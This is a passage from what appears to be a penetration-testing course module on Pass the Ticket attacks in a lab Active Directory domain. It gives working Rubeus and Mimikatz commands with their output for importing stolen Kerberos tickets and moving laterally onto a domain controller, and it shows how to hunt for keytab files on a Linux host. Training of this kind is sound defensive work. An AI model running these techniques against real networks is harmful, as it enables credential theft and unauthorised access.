<p>We can also use the Base64 output from Rubeus or convert a .kirbi to Base64 to perform the Pass the Ticket attack. We can use PowerShell to convert a .kirbi to Base64.</p>
<p><strong>Convert .kirbi to Base64 Format</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Windows</p>
<pre><code class="lang-powershell-session"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">c</span>:\<span class="hljs-selector-tag">tools</span>&gt; <span class="hljs-selector-attr">[Convert]</span><span class="hljs-selector-pseudo">::ToBase64String(</span><span class="hljs-selector-attr">[IO.File]</span><span class="hljs-selector-pseudo">::ReadAllBytes("</span><span class="hljs-selector-attr">[0;6c680]</span><span class="hljs-selector-tag">-2-0-40e10000-plaintext</span>@<span class="hljs-keyword">krbtgt</span>-<span class="hljs-keyword">inlanefreight</span>.<span class="hljs-keyword">htb</span>.<span class="hljs-keyword">kirbi</span>"))

doQAAAWfMIQAAAWZoIQAAAADAgEFoYQAAAADAgEWooQAAAQ5MIQAAAQzYYQAAAQtMIQAAAQnoIQAAAADAgEFoYQAAAAJGwdIVEIuQ09NooQAAAAsMIQAAAAmoIQAAAADAgECoYQAAAAXMIQAAAARGwZrcmJ0Z3QbB0hUQi5DT02jhAAAA9cwhAAAA9GghAAAAAMCARKhhAAAAAMCAQKihAAAA7kEggO1zqm0SuXewDEmypVORXzj8hyqSmikY9gxbM9xdpmA8r2EvTnv0UYkQFdf4B73Ss5ylutsSsyvnZYRVr8Ta9Wx/fvnjpJw/T70suDA4CgsuSZcBSo/jMnDjucWNtlDc8ez6...SNIP...
</code></pre>
<p>Using Rubeus, we can perform a Pass the Ticket providing the Base64 string instead of the file name.</p>
<p><strong>Pass the Ticket - Base64 Format</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Windows</p>
<pre><code class="lang-cmd-session">c:\tools&gt; Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/...SNIP...
 ______        _
(_____ \      |<span class="hljs-string"> </span>|
 _____) )_   _|<span class="hljs-string"> </span>|<span class="hljs-string">__  _____ _   _  ___
</span>|<span class="hljs-string">  __  /</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  _ \</span>|<span class="hljs-string"> ___ </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">/___)
</span>|<span class="hljs-string"> </span>|<span class="hljs-string">  \ \</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_) ) ____</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">___ </span>|
|<span class="hljs-string">_</span>|<span class="hljs-string">   </span>|<span class="hljs-string">_</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">_____)____/(___/

v1.5.0


[*] Action: Import Ticket
[+] ticket successfully imported!

c:\tools&gt; dir \\DC01.inlanefreight.htb\c$
Directory: \\dc01.inlanefreight.htb\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         6/4/2022  11:17 AM                Program Files
d-----         6/4/2022  11:17 AM                Program Files (x86)

&lt;SNIP&gt;</span>
</code></pre>
<p>Finally, we can also perform the Pass the Ticket attack using the Mimikatz module <code>kerberos::ptt</code> and the .kirbi file that contains the ticket we want to import.</p>
<p><strong>Mimikatz - Pass the Ticket</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Windows</p>
<pre><code class="lang-cmd-session">C:\tools&gt; mimikatz.exe 

  .#####.   mimikatz <span class="hljs-number">2.2</span><span class="hljs-number">.0</span> (x64) #<span class="hljs-number">19041</span> Aug  <span class="hljs-number">6</span> <span class="hljs-number">2020</span> <span class="hljs-number">14</span>:<span class="hljs-number">53</span>:<span class="hljs-number">43</span>
 .## ^ ##.  <span class="hljs-string">"A La Vie, A L'Amour"</span> - (oe.eo)
 ## / \ ##  <span class="hljs-comment">/*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/</span>

mimikatz # privilege::debug
Privilege <span class="hljs-string">'20'</span> OK

mimikatz # kerberos::ptt <span class="hljs-string">"C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"</span>

* File: <span class="hljs-string">'C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi'</span>: OK
mimikatz # exit
Bye!

c:\tools&gt; dir \\DC01.inlanefreight.htb\c$

Directory: \\dc01.inlanefreight.htb\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         <span class="hljs-number">6</span>/<span class="hljs-number">4</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">11</span>:<span class="hljs-number">17</span> AM                Program Files
d-----         <span class="hljs-number">6</span>/<span class="hljs-number">4</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">11</span>:<span class="hljs-number">17</span> AM                Program Files (x86)

&lt;SNIP&gt;
</code></pre>
<p>Note: Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module <code>misc</code> to launch a new command prompt window with the imported ticket using the <code>misc::cmd</code> command.</p>
<h3 id="pass-the-ticket-with-powershell-remoting-windows-">Pass The Ticket with PowerShell Remoting (Windows)</h3>
<p><a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2">PowerShell Remoting</a> allows us to run scripts or commands on a remote computer. Administrators often use PowerShell Remoting to manage remote computers on the network. Enabling PowerShell Remoting creates both HTTP and HTTPS listeners. The listener runs on standard port TCP/5985 for HTTP and TCP/5986 for HTTPS.</p>
<p>To create a PowerShell Remoting session on a remote computer, you must have administrative permissions, be a member of the Remote Management Users group, or have explicit PowerShell Remoting permissions in your session configuration.</p>
<p>Suppose we find a user account that doesn&#39;t have administrative privileges on a remote computer but is a member of the Remote Management Users group. In that case, we can use PowerShell Remoting to connect to that computer and execute commands.</p>
<h3 id="mimikatz-powershell-remoting-with-pass-the-ticket">Mimikatz - PowerShell Remoting with Pass the Ticket</h3>
<p>To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import our ticket and then open a PowerShell console and connect to the target machine. Let&#39;s open a new <code>cmd.exe</code> and execute <code>mimikatz.exe</code>, then import the ticket we collected using <code>kerberos::ptt</code>. Once the ticket is imported into our <code>cmd.exe</code> session, we can launch a PowerShell command prompt from the same <code>cmd.exe</code> and use the command <code>Enter-PSSession</code> to connect to the target machine.</p>
<p><strong>Mimikatz - Pass the Ticket for lateral movement.</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Windows</p>
<pre><code class="lang-cmd-session">C:\tools&gt; mimikatz.exe

  .#####.   mimikatz <span class="hljs-number">2.2</span><span class="hljs-number">.0</span> (x64) #<span class="hljs-number">19041</span> Aug <span class="hljs-number">10</span> <span class="hljs-number">2021</span> <span class="hljs-number">17</span>:<span class="hljs-number">19</span>:<span class="hljs-number">53</span>
 .## ^ ##.  <span class="hljs-string">"A La Vie, A L'Amour"</span> - (oe.eo)
 ## / \ ##  <span class="hljs-comment">/*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span>

mimikatz # privilege::debug
Privilege <span class="hljs-string">'20'</span> OK

mimikatz # kerberos::ptt <span class="hljs-string">"C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"</span>

* File: <span class="hljs-string">'C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi'</span>: OK

mimikatz # exit
Bye!

c:\tools&gt;powershell
Windows PowerShell
Copyright (C) <span class="hljs-number">2015</span> Microsoft Corporation. All rights reserved.

PS C:\tools&gt; Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents&gt; whoami
inlanefreight\john
[DC01]: PS C:\Users\john\Documents&gt; hostname
DC01
[DC01]: PS C:\Users\john\Documents&gt;
</code></pre>
<h3 id="rubeus-powershell-remoting-with-pass-the-ticket">Rubeus - PowerShell Remoting with Pass the Ticket</h3>
<p>Rubeus has the option <code>createnetonly</code>, which creates a sacrificial process/logon session (<a href="https://eventlogxp.com/blog/logon-type-what-does-it-mean/">Logon type 9</a>). The process is hidden by default, but we can specify the flag <code>/show</code> to display the process, and the result is the equivalent of <code>runas /netonly</code>. This prevents the erasure of existing TGTs for the current logon session.</p>
<p><strong>Create a sacrificial process with Rubeus</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Windows</p>
<pre><code class="lang-cmd-session">C:\tools&gt; Rubeus.exe createnetonly /program:<span class="hljs-string">"C:\Windows\System32\cmd.exe"</span> /show
   ______        _
  (_____ \      |<span class="hljs-string"> </span>|
   _____) )_   _|<span class="hljs-string"> </span>|<span class="hljs-string">__  _____ _   _  ___
  </span>|<span class="hljs-string">  __  /</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  _ \</span>|<span class="hljs-string"> ___ </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">/___)
  </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  \ \</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_) ) ____</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">___ </span>|
  |<span class="hljs-string">_</span>|<span class="hljs-string">   </span>|<span class="hljs-string">_</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">_____)____/(___/

  v2.0.3


[*] Action: Create process (/netonly)


[*] Using random username and password.

[*] Showing process : True
[*] Username        : JMI8CL7C
[*] Domain          : DTCDV6VL
[*] Password        : MRWI6XGI
[+] Process         : 'cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 1556
[+] LUID            : 0xe07648</span>
</code></pre>
<p>The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option <code>/ptt</code> to import the ticket into our current session and connect to the DC using PowerShell Remoting.</p>
<p><strong>Rubeus - Pass the Ticket for lateral movement</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Windows</p>
<pre><code class="lang-cmd-session"><span class="hljs-string">C:</span>\tools&gt; Rubeus.exe asktgt <span class="hljs-regexp">/user:john /</span><span class="hljs-string">domain:</span>inlanefreight.htb <span class="hljs-regexp">/aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /</span>ptt
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  <span class="hljs-regexp">/| | | |  _ \| ___ | | | |/</span>___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____<span class="hljs-regexp">/|____/</span>|_____)____<span class="hljs-regexp">/(___/</span>

  v2<span class="hljs-number">.0</span><span class="hljs-number">.3</span>

[*] <span class="hljs-string">Action:</span> Ask TGT

[*] Using aes256_cts_hmac_sha1 <span class="hljs-string">hash:</span> <span class="hljs-number">9279</span>bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc
[*] Building AS-REQ (w/ preauth) <span class="hljs-string">for:</span> <span class="hljs-string">'inlanefreight.htb\john'</span>
[*] Using domain <span class="hljs-string">controller:</span> <span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.120</span>:<span class="hljs-number">88</span>
[+] TGT request successful!
[*] Base64(ticket.kirbi):

      doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRC
      oiYwJKADAgECoR0wGxsGa3JidGd0GxFpbmxhbmVmcmVpZ2h0Lmh0YqOCBFAwggRMoAMCARKhAwIBAqKC
      BD4EggQ6JFh+c<span class="hljs-regexp">/cFI8UqumM6GPaVpUhz3ZSyXZTIHiI/</span>b3jOFtjyD/uYTqXAAq2CkakjomzCUyqUfIE5
      +<span class="hljs-number">2</span>dvJYclANm44EvqGZlMkFvHK40slyFEK6E6d7O+BWtGye2ytdJr9WWKWDiQLAJ97nrZ9zhNCfeWWQNQ
      dpAEeCZP59dZeIUfQlM3+<span class="hljs-regexp">/oEvyJBqeR6mc3GuicxbJA743TLyQt8ktOHU0oIz0oi2p/</span>VYQfITlXBmpIT
      OZ6+<span class="hljs-regexp">/vfpaqF68Y/</span><span class="hljs-number">5</span>p61V+B8XRKHXX2JuyX5+d9i3VZhzVFOFa+h5+efJyx3kmzFMVbVGbP1DyAG1JnQO
      h1z2T1egbKX/Ola4unJQRZXblwx+xk+MeX0IEKqnQmHzIYU1Ka0px5qnxDjObG+Ji795TFpEo04kHRwv
      zSoFAIWxzjnpe4J9sraXkLQ/btef8p6qAfeYqWLxNbA+eUEiKQpqkfzbxRB5Pddr1TEONiMAgLCMgphs
      gVMLj6wtH+gQc0ohvLgBYUgJnSHV8lpBBc<span class="hljs-regexp">/OPjPtUtAohJoas44DZRCd7S9ruXLzqeUnqIfEZ/</span>DnJh3H
      SYtH8NNSXoSkv0BhotVXUMPX1yesjzwEGRokLjsXSWg/<span class="hljs-number">4</span>XQtcFgpUFv7hTYTKKn92dOEWePhDDPjwQmk
      H6MP0BngGaLK5vSA9AcUSi2l+DSaxaR6uK1bozMgM7puoyL8MPEhCe+ajPoX4TPn3cJLHF1fHofVSF4W
      nkKhzEZ0wVzL8PPWlsT+Olq5TvKlhmIywd3ZWYMT98kB2igEUK2G3jM7XsDgwtPgwIlP02bXc2mJF/VA
      qBzVwXD0ZuFIePZbPoEUlKQtE38cIumRyfbrKUK5RgldV+wHPebhYQvFtvSv05mdTlYGTPkuh5FRRJ0e
      WIw0HWUm3u/NAIhaaUal+DHBYkdkmmc2RTWk34NwYp7JQIAMxb68fTQtcJPmLQdWrGYEehgAhDT2hX+<span class="hljs-number">8</span>
      VMQSJoodyD4AEy2bUISEz6x5gjcFMsoZrUmMRLvUEASB/IBW6pH+<span class="hljs-number">4</span>D52rLEAsi5kUI1BHOUEFoLLyTNb
      <span class="hljs-number">4</span>rZKvWpoibi5sHXe0O0z6BTWhQceJtUlNkr4jtTTKDv1sVPudAsRmZtR2GRr984NxUkO6snZo7zuQiud
      <span class="hljs-number">7</span>w2NUtKwmTuKGUnNcNurz78wbfild2eJqtE9vLiNxkw+AyIr+gcxvMipDCP9tYCQx1uqCFqTqEImOxpN
      BqQf<span class="hljs-regexp">/MDhdvked+p46iSewqV/</span><span class="hljs-number">4</span>iaAvEJRV0lBHfrgTFA3HYAhf062LnCWPTTBZCPYSqH68epsn4OsS+RB
      gwJFGpR++u1h<span class="hljs-comment">//+4Zi++gjsX/+vD3Tx4YUAsMiOaOZRiYgBWWxsI02NYyGSBIwRC3yGwzQAoIT43EhAu</span>
      HjYiDIdccqxpB1+<span class="hljs-number">8</span>vGwkkV7DEcFM1XFwjuREzYWafF0OUfCT69ZIsOqEwimsHDyfr6WhuKua034Us2/V
      <span class="hljs-number">8</span>wYbbKYjVj+jgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCDlV0Bp6+en
      HH9<span class="hljs-regexp">/2tewMMt8rq0f7ipDd/</span>UaU4HUKUFaHaETGxFJTkxBTkVGUkVJR0hULkhUQqIRMA+gAwIBAaEIMAYb
      BGpvaG6jBwMFAEDhAAClERgPMjAyMjA3MTgxMjQ0NTBaphEYDzIwMjIwNzE4MjI0NDUwWqcRGA8yMDIy
      MDcyNTEyNDQ1MFqoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEWlubGFu
      ZWZyZWlnaHQuaHRi
[+] Ticket successfully imported!

  <span class="hljs-string">ServiceName              :</span>  krbtgt/inlanefreight.htb
  <span class="hljs-string">ServiceRealm             :</span>  INLANEFREIGHT.HTB
  <span class="hljs-string">UserName                 :</span>  john
  <span class="hljs-string">UserRealm                :</span>  INLANEFREIGHT.HTB
  <span class="hljs-string">StartTime                :</span>  <span class="hljs-number">7</span><span class="hljs-regexp">/18/</span><span class="hljs-number">2022</span> <span class="hljs-number">5</span>:<span class="hljs-number">44</span>:<span class="hljs-number">50</span> AM
  <span class="hljs-string">EndTime                  :</span>  <span class="hljs-number">7</span><span class="hljs-regexp">/18/</span><span class="hljs-number">2022</span> <span class="hljs-number">3</span>:<span class="hljs-number">44</span>:<span class="hljs-number">50</span> PM
  <span class="hljs-string">RenewTill                :</span>  <span class="hljs-number">7</span><span class="hljs-regexp">/25/</span><span class="hljs-number">2022</span> <span class="hljs-number">5</span>:<span class="hljs-number">44</span>:<span class="hljs-number">50</span> AM
  <span class="hljs-string">Flags                    :</span>  name_canonicalize, pre_authent, initial, renewable, forwardable
  <span class="hljs-string">KeyType                  :</span>  aes256_cts_hmac_sha1
  Base64(key)              :  <span class="hljs-number">5</span>VdAaevnpxx/f9rXsDDLfK6tH+<span class="hljs-number">4</span>qQ3f1GlOB1ClBWh0=
  ASREP (key)              :  <span class="hljs-number">9279</span>BCBD40DB957A0ED0D3856B2E67F9BB58E6DC7FC07207D0763CE2713F11DC
<span class="hljs-symbol">
c:</span>\tools&gt;powershell
Windows PowerShell
Copyright (C) <span class="hljs-number">2015</span> Microsoft Corporation. All rights reserved.

PS <span class="hljs-string">C:</span>\tools&gt; Enter-PSSession -ComputerName DC01
[DC01]: PS <span class="hljs-string">C:</span>\Users\john\Documents&gt; whoami
inlanefreight\john
[DC01]: PS <span class="hljs-string">C:</span>\Users\john\Documents&gt; hostname
DC01
</code></pre>
<h3 id="moving-on">Moving on</h3>
<p>We&#39;ve now covered multiple ways to perform Pass the Ticket attacks from a Windows host. The following section will cover this same lateral movement technique using a Linux attack host.</p>
<hr>
<h2 id="pass-the-ticket-ptt-from-linux">Pass the Ticket (PtT) from Linux</h2>
<p>Although not common, Linux computers can connect to Active Directory to provide centralized identity management and integrate with the organization&#39;s systems, giving users the ability to have a single identity to authenticate on Linux and Windows computers.</p>
<p>A Linux computer connected to Active Directory commonly uses Kerberos as authentication. Suppose this is the case, and we manage to compromise a Linux machine connected to Active Directory. In that case, we could try to find Kerberos tickets to impersonate other users and gain more access to the network.</p>
<p>A Linux system can be configured in various ways to store Kerberos tickets. We&#39;ll discuss a few different storage options in this section.</p>
<p>Note: A Linux machine not connected to Active Directory could use Kerberos tickets in scripts or to authenticate to the network. It is not a requirement to be joined to the domain to use Kerberos tickets from a Linux machine.</p>
<h3 id="kerberos-on-linux">Kerberos on Linux</h3>
<p>Windows and Linux use the same process to request a Ticket Granting Ticket (TGT) and Service Ticket (TGS). However, how they store the ticket information may vary depending on the Linux distribution and implementation.</p>
<p>In most cases, Linux machines store Kerberos tickets as <a href="https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html">ccache files</a> in the <code>/tmp</code> directory. By default, the location of the Kerberos ticket is stored in the environment variable <code>KRB5CCNAME</code>. This variable can identify if Kerberos tickets are being used or if the default location for storing Kerberos tickets is changed. These <a href="https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html">ccache files</a> are protected by specific read/write permissions, but a user with elevated privileges or root privileges could easily gain access to these tickets.</p>
<p>Another everyday use of Kerberos in Linux is with <a href="https://kb.iu.edu/d/aumh">keytab</a> files. A <a href="https://kb.iu.edu/d/aumh">keytab</a> is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password). You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password. However, when you change your password, you must recreate all your keytab files.</p>
<p><a href="https://kb.iu.edu/d/aumh">Keytab</a> files commonly allow scripts to authenticate automatically using Kerberos without requiring human interaction or access to a password stored in a plain text file. For example, a script can use a keytab file to access files stored in the Windows share folder.</p>
<p>Note: Any computer that has a Kerberos client installed can create keytab files. Keytab files can be created on one computer and copied for use on other computers because they are not restricted to the systems on which they were initially created.</p>
<h3 id="scenario">Scenario</h3>
<p>To practice and understand how we can abuse Kerberos from a Linux system, we have a computer (<code>LINUX01</code>) connected to the Domain Controller. This machine is only reachable through <code>MS01</code>. To access this machine over SSH, we can connect to <code>MS01</code> via RDP and, from there, connect to the Linux machine using SSH from the Windows command line. Another option is to use a port forward. If you don&#39;t know how to do it, you can read the module <a href="https://academy.hackthebox.com/module/details/158">Pivoting, Tunneling, and Port Forwarding</a>.</p>
<p><strong>Linux auth from MS01</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/linux-auth-from-ms01.jpg" alt="Remote desktop session showing a terminal with Ubuntu system information, including hostname &#39;MS01&#39;, system load, memory usage, and update notifications."></p>
<p>As an alternative, we created a port forward to simplify the interaction with <code>LINUX01</code>. By connecting to port TCP/2222 on <code>MS01</code>, we will gain access to port TCP/22 on <code>LINUX01</code>.</p>
<p>Let&#39;s assume we are in a new assessment, and the company gives us access to <code>LINUX01</code> and the user <code>david@inlanefreight.htb</code> and password <code>Password2</code>.</p>
<p><strong>Linux auth via port forward</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ssh david@inlanefreight.htb@<span class="hljs-number">10.129</span>.<span class="hljs-number">204.23</span> -p <span class="hljs-number">2222</span>

david@inlanefreight.htb@<span class="hljs-number">10.129</span>.<span class="hljs-number">204.23</span><span class="hljs-symbol">'s</span> password: 
Welcome <span class="hljs-keyword">to</span> Ubuntu <span class="hljs-number">20.04</span>.<span class="hljs-number">5</span> LTS (GNU/Linux <span class="hljs-number">5.4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">126</span>-<span class="hljs-keyword">generic</span> x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as <span class="hljs-keyword">of</span> Tue <span class="hljs-number">11</span> Oct <span class="hljs-number">2022</span> <span class="hljs-number">09</span>:<span class="hljs-number">30</span>:<span class="hljs-number">58</span> AM UTC

  System load:  <span class="hljs-number">0.09</span>               Processes:               <span class="hljs-number">227</span>
  Usage <span class="hljs-keyword">of</span> /:   <span class="hljs-number">38.1</span>% <span class="hljs-keyword">of</span> <span class="hljs-number">13.70</span>GB   Users logged <span class="hljs-keyword">in</span>:         <span class="hljs-number">2</span>
  Memory usage: <span class="hljs-number">32</span>%                IPv4 address <span class="hljs-keyword">for</span> ens160: <span class="hljs-number">172.16</span>.<span class="hljs-number">1.15</span>
  Swap usage:   <span class="hljs-number">0</span>%

 * Super-optimized <span class="hljs-keyword">for</span> small spaces - read how we shrank the memory
   footprint <span class="hljs-keyword">of</span> MicroK8s <span class="hljs-keyword">to</span> make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

<span class="hljs-number">12</span> updates can be applied immediately.
<span class="hljs-keyword">To</span> see these additional updates run: apt list <span class="hljs-comment">--upgradable</span>

<span class="hljs-keyword">New</span> <span class="hljs-keyword">release</span> '<span class="hljs-number">22.04</span>.<span class="hljs-number">1</span> LTS' available.
Run <span class="hljs-symbol">'do</span>-<span class="hljs-keyword">release</span>-upgrade' <span class="hljs-keyword">to</span> upgrade <span class="hljs-keyword">to</span> it.


Last login: Tue Oct <span class="hljs-number">11</span> <span class="hljs-number">09</span>:<span class="hljs-number">30</span>:<span class="hljs-number">46</span> <span class="hljs-number">2022</span> from <span class="hljs-number">172.16</span>.<span class="hljs-number">1.5</span>
david@inlanefreight.htb@linux01:~$
</code></pre>
<h3 id="identifying-linux-and-active-directory-integration">Identifying Linux and Active Directory integration</h3>
<p>We can identify if the Linux machine is domain-joined using <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd">realm</a>, a tool used to manage system enrollment in a domain and set which domain users or groups are allowed to access the local system resources.</p>
<p><strong>realm - Check if Linux machine is domain-joined</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-shell-session">david<span class="hljs-meta">@inlanefreight</span>.htb<span class="hljs-meta">@linux</span><span class="hljs-number">01:</span>~$ realm list

inlanefreight.htb
<span class="hljs-symbol">  type:</span> kerberos
  realm-<span class="hljs-string">name:</span> INLANEFREIGHT.HTB
  domain-<span class="hljs-string">name:</span> inlanefreight.htb
<span class="hljs-symbol">  configured:</span> kerberos-member
  server-<span class="hljs-string">software:</span> active-directory
  client-<span class="hljs-string">software:</span> sssd
  required-<span class="hljs-string">package:</span> sssd-tools
  required-<span class="hljs-string">package:</span> sssd
  required-<span class="hljs-string">package:</span> libnss-sss
  required-<span class="hljs-string">package:</span> libpam-sss
  required-<span class="hljs-string">package:</span> adcli
  required-<span class="hljs-string">package:</span> samba-common-bin
  login-<span class="hljs-string">formats:</span> %U<span class="hljs-meta">@inlanefreight</span>.htb
  login-<span class="hljs-string">policy:</span> allow-permitted-logins
  permitted-<span class="hljs-string">logins:</span> david<span class="hljs-meta">@inlanefreight</span>.htb, julio<span class="hljs-meta">@inlanefreight</span>.htb
  permitted-<span class="hljs-string">groups:</span> Linux Admins
</code></pre>
<p>The output of the command indicates that the machine is configured as a Kerberos member. It also gives us information about the domain name (inlanefreight.htb) and which users and groups are permitted to log in, which in this case are the users David and Julio and the group Linux Admins.</p>
<p>In case <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd">realm</a> is not available, we can also look for other tools used to integrate Linux with Active Directory such as <a href="https://sssd.io/">sssd</a> or <a href="https://www.samba.org/samba/docs/current/man-html/winbindd.8.html">winbind</a>. Looking for those services running in the machine is another way to identify if it is domain-joined. We can read this <a href="https://web.archive.org/web/20210624040251/https://www.2daygeek.com/how-to-identify-that-the-linux-server-is-integrated-with-active-directory-ad/">blog post</a> for more details. Let&#39;s search for those services to confirm if the machine is domain-joined.</p>
<p><strong>PS - Check if Linux machine is domain-joined</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-shell-session">david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"

root       <span class="hljs-number"> 2140 </span>     <span class="hljs-number"> 1 </span><span class="hljs-number"> 0 </span>Sep29 ?        00:00:01 /usr/sbin/sssd -i --logger=files
root       <span class="hljs-number"> 2141 </span>  <span class="hljs-number"> 2140 </span><span class="hljs-number"> 0 </span>Sep29 ?        00:00:08 /usr/libexec/sssd/sssd_be --domain inlanefreight.htb --uid<span class="hljs-number"> 0 </span>--gid<span class="hljs-number"> 0 </span>--logger=files
root       <span class="hljs-number"> 2142 </span>  <span class="hljs-number"> 2140 </span><span class="hljs-number"> 0 </span>Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_nss --uid<span class="hljs-number"> 0 </span>--gid<span class="hljs-number"> 0 </span>--logger=files
root       <span class="hljs-number"> 2143 </span>  <span class="hljs-number"> 2140 </span><span class="hljs-number"> 0 </span>Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_pam --uid<span class="hljs-number"> 0 </span>--gid<span class="hljs-number"> 0 </span>--logger=files
</code></pre>
<h3 id="finding-kerberos-tickets-in-linux">Finding Kerberos tickets in Linux</h3>
<p>As an attacker, we are always looking for credentials. On Linux domain-joined machines, we want to find Kerberos tickets to gain more access. Kerberos tickets can be found in different places depending on the Linux implementation or the administrator changing default settings. Let&#39;s explore some common ways to find Kerberos tickets.</p>
<h3 id="finding-keytab-files">Finding KeyTab files</h3>
<p>A straightforward approach is to use <code>find</code> to search for files whose name contains the word <code>keytab</code>. When an administrator commonly creates a Kerberos ticket to be used with a script, it sets the extension to <code>.keytab</code>. Although not mandatory, it is a way in which administrators commonly refer to a keytab file.</p>
<p><strong>Using Find to search for files with keytab in the name</strong></p>
<p>&#x20; Pass the Ticket (PtT) from Linux</p>
<pre><code class="lang-shell-session">david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2&gt;/dev/null

...SNIP...

  <span class="hljs-number"> 131610 </span>    <span class="hljs-number"> 4 </span>-rw-------  <span class="hljs-number"> 1 </span>root     root        <span class="hljs-number"> 1348 </span>Oct <span class="hljs-number"> 4 </span>16:26 /etc/krb5.keytab
  <span class="hljs-number"> 262169 </span>    <span class="hljs-number"> 4 </span>-rw-rw-rw-  <span class="hljs-number"> 1 </span>root     root         <span class="hljs-number"> 216 </span>Oct<span class="hljs-number"> 12 </span>15:13 /opt/specialfiles/carlos.keytab
</code></pre>
<p>Note: To use a keytab file, we must have read and write (rw) privileges on the file.</p>
<p>Another way to find <code>KeyTab</code> files is in automated scripts configured using a cronjob or any other Linux service. If an administrator needs to run a script to interact with a Windows service that uses Kerberos, and if the keytab file does not have the <code>.keytab</code> extension, we may find the appropriate filename within the script. Let&#39;s see this example:</p>
